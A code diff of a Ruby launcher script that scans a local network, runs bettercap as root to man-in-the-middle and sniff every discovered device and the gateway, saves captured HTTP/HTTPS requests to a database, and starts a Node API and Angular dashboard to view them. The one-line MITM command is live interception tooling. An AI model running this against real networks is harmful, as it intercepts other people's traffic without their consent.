@@ -77,14 +77,23 @@ puts "---- NEW DEVICES LIST----"
 Devices.each{|a| puts a}
 
 puts " Performing MITM attack against all device and the gateway"
+
 Devices.each{ |device| fork{exec("sudo bettercap -G "+gateway_ip+" --target "+device.ip.to_s+" --no-discovery  --sniffer | grep \"https:\|http:\"  |ruby saver.rb")}  }
 puts "Now is performing the MITM, and saving all request in db, you can access to the web interface at port 4200 or raw data (JSON API) at port 8000 "
- 
-# NOW starting nodejs api 
-fork{ exec("node .api/server.js")}
+puts "STARTING NODEJS Express API"
+# NOW starting nodejs api
+fork{ exec("cd api ; node server.js")}
 
-# Now startng angular client 
-fork { exec("ng serve ./client/networktraker")}
+puts "Starting angular APPLICATION"
+# Now startng angular client
+puts "-Compiling...."
 
+fork { exec("cd ./client/networktraker ; ng build --watch >>/dev/null")}
+sleep(120)
+puts "-Serving..."
+fork { exec("cd ./client/networktraker/dist/networktraker/ ; lite-server --basedir=\".\" >>/dev/null")}
+
+
+puts "Starting netscanner..."
 # create a process that refresh connected devices on network, this will perform just a scan of lan, and provide just a list of ip and names.
-fork {exec("sudo ruby netscanner.rb")}
+fork {exec("sudo ruby networkscanner.rb >> /dev/null")}
